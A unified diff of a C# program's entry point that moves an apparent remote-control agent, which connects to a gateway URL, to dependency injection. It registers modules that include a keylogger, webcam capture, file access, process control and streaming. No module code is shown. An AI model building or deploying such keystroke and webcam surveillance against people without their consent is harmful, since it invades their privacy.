@@ -9,6 +9,8 @@ using System.Windows.Forms;
 using AgentSystem.Core;
 using AgentSystem.Managers;
 using Serilog;
+using Microsoft.Extensions.DependencyInjection;
+using AgentSystem.Modules;
 
 namespace AgentSystem
 {
@@ -49,7 +51,34 @@ namespace AgentSystem
                 }
             }
 
-            AgentClient agent = new AgentClient(agentId, gatewayUrl);
+            var services = new ServiceCollection();
+            // 1. Đăng ký các Manager (Singleton - chỉ tạo 1 instance duy nhất)
+            services.AddSingleton<SecurityManager>();
+            services.AddSingleton<UIManager>();
+
+            // 2. Đăng ký các Module
+            services.AddTransient<BaseModule, AppModule>();
+            services.AddTransient<BaseModule, ProcessModule>();
+            services.AddTransient<BaseModule, KeyloggerModule>();
+            services.AddTransient<BaseModule, WebcamModule>();
+            services.AddTransient<BaseModule, FileModule>();
+            services.AddTransient<BaseModule, StreamModule>();
+            services.AddTransient<BaseModule, PowerModule>();
+
+            // 3. Đăng ký AgentClient & IAgentContext
+            services.AddSingleton<AgentClient>(provider => 
+            {
+                var security = provider.GetRequiredService<SecurityManager>();
+                var ui = provider.GetRequiredService<UIManager>();
+                var modules = provider.GetServices<BaseModule>();
+                
+                return new AgentClient(agentId, gatewayUrl, security, ui, modules);
+            });
+            services.AddSingleton<IAgentContext>(provider => provider.GetRequiredService<AgentClient>());
+
+            // 4. Build Container và lấy AgentClient ra chạy
+            var serviceProvider = services.BuildServiceProvider();
+            AgentClient agent = serviceProvider.GetRequiredService<AgentClient>();
 
             try
             {
